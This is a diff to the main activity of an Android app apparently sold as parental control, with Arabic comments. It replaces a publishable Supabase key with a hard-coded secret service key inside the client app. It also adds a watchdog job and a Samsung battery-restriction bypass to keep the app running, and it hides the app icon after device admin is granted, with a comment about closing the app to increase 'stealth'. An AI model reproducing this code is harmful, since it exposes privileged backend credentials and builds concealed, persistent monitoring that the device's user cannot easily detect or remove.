@@ -1,9 +1,11 @@
 package com.example.parentalcontrol
 
 import android.app.Activity
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
@@ -32,7 +34,7 @@ class MainActivity : AppCompatActivity() {
             // 2. تهيئة Supabase بصيغة آمنة
             val initialized = SupabaseManager.getInstance().initialize(
                 "https://kubowqqqawkgghxcktoe.supabase.co",
-                "sb_publishable_FqWCa9bFxQtKKt9jW2ZlEw_ZXM4oIRj"
+                "sb_secret_wNza7KnqwnZeidrwqpVsQQ_g0a05_YG"
             )
 
             if (!initialized) {
@@ -47,17 +49,24 @@ class MainActivity : AppCompatActivity() {
                 SupabaseManager.getInstance().updateHeartbeat(this@MainActivity)
             }
 
-            // 5. إعداد الواجهة والطلبات
+            // 5. إعداد نظام المراقبة (Watchdog) لضمان استمرار الخدمة
+            ServiceWatchdogJobService.schedule(this)
+
+            // 6. إعداد الواجهة والطلبات
             setupUI()
             requestIgnoreBatteryOptimizations()
+            
+            // 7. تجاوز قيود سامسونج للبطارية إذا لزم الأمر
+            if (Build.MANUFACTURER.contains("samsung", ignoreCase = true)) {
+                launchSamsungBatterySettings()
+            }
 
-            // 5. تفعيل التخفي بتأخير بسيط لتجنب مشاكل Lifecycle في أول تشغيل
+            // 8. تفعيل التخفي بتأخير بسيط
             if (parentalControlManager.isAdminActive()) {
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                     try {
                         StealthManager.hideAppIcon(this)
-                        // نغلق الواجهة بعد إخفاء الأيقونة لإكمال عملية التخفي
-                        // finish() 
+                        // finish() // يمكن إغلاقه لزيادة التخفي بعد الإعداد الأول
                     } catch (e: Exception) {
                         Log.e("MainActivity", "Stealth error: ${e.message}")
                     }
@@ -67,6 +76,31 @@ class MainActivity : AppCompatActivity() {
             Log.e("MainActivity", "Critical error in onCreate", e)
             val errorMsg = "${e.javaClass.simpleName}: ${e.message}"
             Toast.makeText(this, "خطأ في بدء التشغيل: $errorMsg", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    /**
+     * تجاوز ميزة تحسين البطارية الخاصة بسامسونج لضمان بقاء التطبيق في الخلفية
+     */
+    private fun launchSamsungBatterySettings() {
+        try {
+            val intent = Intent()
+            intent.component = ComponentName(
+                "com.samsung.android.lool",
+                "com.samsung.android.sm.ui.battery.BatteryActivity"
+            )
+            // إذا لم ينجح الأول، نجرب العام لسامسونج
+            try {
+                startActivity(intent)
+            } catch (e: Exception) {
+                intent.component = ComponentName(
+                    "com.samsung.android.sm",
+                    "com.samsung.android.sm.ui.battery.BatteryActivity"
+                )
+                startActivity(intent)
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Samsung battery settings not found: ${e.message}")
         }
     }
 
